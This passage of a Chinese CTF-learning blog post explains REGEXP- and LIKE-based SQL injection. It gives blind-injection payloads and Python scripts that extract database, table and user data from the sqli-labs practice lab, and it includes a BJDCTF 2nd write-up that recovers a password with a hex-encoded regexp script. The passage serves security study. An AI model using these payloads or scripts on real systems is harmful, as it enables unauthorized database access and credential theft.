<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'^a'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------+</span>
<span class="token operator">|</span> username <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------+</span>
<span class="token operator">|</span> Dumb     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.11</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'^D'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-----------------------------------------------------+</span>
<span class="token operator">|</span> <span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'^D'</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------------------------------------------+</span>
<span class="token operator">|</span>                                                   <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------------------------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.04</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'^a'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-----------------------------------------------------+</span>
<span class="token operator">|</span> <span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'^a'</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------------------------------------------+</span>
<span class="token operator">|</span>                                                   <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------------------------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.04</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>^</code>表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0</p>
<p>（2）regexp关键字还可以代替where条件里的=号</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> password <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------+</span>
<span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------+</span>
<span class="token operator">|</span> Dumb     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.05</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> password <span class="token operator">regexp</span> <span class="token string">'^Du'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb     <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.04</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用场景：</p>
<blockquote>
<p>过滤了=、in、like</p>
</blockquote>
<p><code>^</code>若被过滤，可使用<code>$</code>来从后往前进行匹配（深有感悟啊~~），常用regexp正则语句：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">regexp</span> <span class="token string">'^[a-z]'</span>  <span class="token comment">#判断一个表的第一个字符串是否在a-z中</span>
<span class="token operator">regexp</span> <span class="token string">'^r'</span>      <span class="token comment">#判断第一个字符串是否为r</span>
<span class="token operator">regexp</span> <span class="token string">'^r[a-z]'</span> <span class="token comment">#判断一个表的第二个字符串是否在a-z中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>（3）在联合查询中的使用</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'^s'</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231215205452658.png" alt="image-20231215205452658"></p>
<p><img src="image-20231215205541822.png" alt="image-20231215205541822"></p>
<p>上述password处只会显示1或者0，这样就能知道我们的regexp是否匹配成功。</p>
<h3 id="2、REGEXP盲注">2、REGEXP盲注</h3>
<p>在sqli-labs靶场Less-8关进行测试</p>
<p><strong>1.判断数据库长度</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">--+ 正常</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>2.判断数据库名</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' or database() regexp '</span><span class="token operator">^</span>s<span class="token string">'--+ 正常
'</span> <span class="token operator">or</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'y$'</span><span class="token comment">--+ 正常</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>表名、字段名、数据内容不再赘述。很明显和普通的布尔盲注差不多，附上大师傅的脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

strs <span class="token operator">=</span> string<span class="token punctuation">.</span>printable
url <span class="token operator">=</span> <span class="token string">"http://x.x.x.x:8001/Less-8/index.php?id="</span>

database1 <span class="token operator">=</span> <span class="token string">"' or database() regexp '^{}'--+"</span>
table1 <span class="token operator">=</span> <span class="token string">"' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^{}'--+"</span>
cloumn1 <span class="token operator">=</span> <span class="token string">"' or (select column_name from information_schema.columns where table_name=\"users\" and table_schema=database() limit 1,1) regexp '^{}'--+"</span>
data1 <span class="token operator">=</span> <span class="token string">"' or (select username from users limit 0,1) regexp '^{}'--+"</span>

payload <span class="token operator">=</span> database1
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        char <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
            payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token operator">+</span>j<span class="token punctuation">)</span>
            urls <span class="token operator">=</span> url<span class="token operator">+</span>payloads
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"You are in"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                name <span class="token operator">+=</span> j
                <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
                char <span class="token operator">=</span> j
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> char <span class="token operator">==</span><span class="token string">'#'</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="LIKE注入分析">LIKE注入分析</h2>
<p><strong>like匹配</strong></p>
<p>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线<code>_</code>通配符允许匹配任何单个字符。</p>
<h3 id="1、基本注入-2">1、基本注入</h3>
<p><strong>1.<code>like 's%'</code>判断第一个字符是否为s</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'s%'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>2.<code>like 'se%'</code>判断前面两个字符串是否为se</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'se%'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>3.<code>like '%se%'</code> 判断是否包含se两个字符串</strong>  --不过测试下来发现待测字符的开头一定要为正确的，否则页面一直返回0，也就是无法匹配类似<code>%ecu%</code>这类字符</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%se%'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>4.<code>like '_____'</code>判断是否为5个字符</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'_____'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>5.<code>like 's____'</code> 判断第一个字符是否为s</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'s____'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231215210444287.png" alt="image-20231215210444287"></p>
<h3 id="2、LIKE盲注">2、LIKE盲注</h3>
<p>依旧在sqli-labs靶场Less-8关进行测试</p>
<p><strong>1.判断数据库长度</strong><br>
可用length()函数，也可用<code>_</code>，如：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' or database() like '</span>________'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>2.判断数据库名</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' or database() like '</span>s<span class="token operator">%</span><span class="token string">'--+
也可用
'</span> <span class="token operator">or</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'s_______'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20231215210703023.png" alt="image-20231215210703023"></p>
<p><img src="image-20231215210719431.png" alt="image-20231215210719431"></p>
<p>说明数据库名的第一个字符是s。数据表、字段、数据类似，把REGEXP盲注脚本改一下，于是成了LIKE盲注脚本：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

strs <span class="token operator">=</span> string<span class="token punctuation">.</span>printable
url <span class="token operator">=</span> <span class="token string">"http://x.x.x.x:8001/Less-8/index.php?id="</span>

database1 <span class="token operator">=</span> <span class="token string">"' or database() like '{}%'--+"</span>
table1 <span class="token operator">=</span> <span class="token string">"' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}%'--+"</span>
cloumn1 <span class="token operator">=</span> <span class="token string">"' or (select column_name from information_schema.columns where table_name=\"users\" and table_schema=database() limit 1,1) like '{}%'--+"</span>
data1 <span class="token operator">=</span> <span class="token string">"' or (select username from users limit 0,1) like '{}%'--+"</span>

payload <span class="token operator">=</span> database1
<span class="token keyword">if</span> __name__ <span class="token operator">=</span><span class="token operator">=</span> <span class="token string">"__main__"</span>:
    name <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token operator">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span>:
        <span class="token keyword">char</span> <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">for</span> j <span class="token operator">in</span> strs:
            payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>name<span class="token operator">+</span>j<span class="token punctuation">)</span>
            urls <span class="token operator">=</span> url<span class="token operator">+</span>payloads
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"You are in"</span> <span class="token operator">in</span> r<span class="token punctuation">.</span><span class="token keyword">text</span>:
                name <span class="token operator">+</span><span class="token operator">=</span> j
                <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span><span class="token keyword">end</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
                <span class="token keyword">char</span> <span class="token operator">=</span> j
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> <span class="token keyword">char</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token string">'#'</span>:
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20231215210857723.png" alt="image-20231215210857723"></p>
<h3 id="3、REGEXP注入实战">3、REGEXP注入实战</h3>
<h4 id="BJDCTF-2nd-简单注入">BJDCTF 2nd 简单注入</h4>
<p><img src="image-20231215213109014.png" alt="image-20231215213109014"></p>
<p>发现提示</p>
<p><img src="image-20231215213135245.png" alt="image-20231215213135245"></p>
<p>这里给出了sql语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Only u input the correct password <span class="token keyword">then</span> u can get the flag
<span class="token operator">and</span> p3rh4ps wants a girl friend<span class="token punctuation">.</span>

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$_POST["username"]'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$_POST["password"]'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>很明显又是相同的套路，我们进行如下赋值：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>haha\
password<span class="token operator">=</span><span class="token string">'or 1#'</span>

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'(haha\' and password='</span><span class="token punctuation">)</span><span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#'; #括号只是一个提示作用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>简单fuzz一下看一下过滤情况：</p>
<pre class="line-numbers language-none"><code class="language-none">过滤的有：select、union、'、=、like等等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>但是没过滤regexp</p>
<p><img src="image-20231215213832727.png" alt="image-20231215213832727"></p>
<p>如上图发现页面有变化，接下来进一步测试</p>
<p><img src="image-20231215214058299.png" alt="image-20231215214058299"></p>
<p><img src="image-20231215214043397.png" alt="image-20231215214043397"></p>
<p>发现页面回显不一致，但始终只有这两条信息，这意味着我们需要进行盲注了，直接上脚本，这里我先尝试自己写一番</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> result


strs <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
url <span class="token operator">=</span> <span class="token string">"http://f973c801-88f4-44ee-9a5c-ec1911041314.node4.buuoj.cn:81/"</span>
payload <span class="token operator">=</span> <span class="token string">'or password regexp binary {}#'</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
            passwd <span class="token operator">=</span> str2hex<span class="token punctuation">(</span><span class="token string">'^'</span> <span class="token operator">+</span> name <span class="token operator">+</span> j<span class="token punctuation">)</span>
            payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>
            data <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin\\'</span><span class="token punctuation">,</span>
                <span class="token string">'password'</span><span class="token punctuation">:</span> payloads
            <span class="token punctuation">}</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"BJD needs"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                name <span class="token operator">+=</span> j
                <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20231215215446707.png" alt="image-20231215215446707"></p>
<p>成功得到密码，我们登录即可得到flag</p>
<p><img src="image-20231215215519726.png" alt="image-20231215215519726"></p>
<h1>0x05 后言</h1>
<p>本次对于报错注入的学习有些许深刻，日后会随缘更新补充本文，希望可以对报错注入有一个完全的掌握。</p>
<h1>0x06 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ssslq/article/details/129285751">SQL报错注入（下）</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9849#toc-3">如何使用 MySQL exp() 函数进行 Sql 注入</a></p>
<p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2015/11/19/sql-error/#more">SQL 显错注入</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55793759/article/details/127078074">2021-虎符网络安全赛道-hatenum | exp()函数与正则过滤</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.z3ratu1.top/%5BHFCTF2021%5Dhatenum.html">[HFCTF2021]hatenum</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8003#toc-7">REGEXP注入与LIKE注入学习笔记</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/">http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">
                                    <span class="chip bg-color">基本知识</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">随缘，看各位佬的心情</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
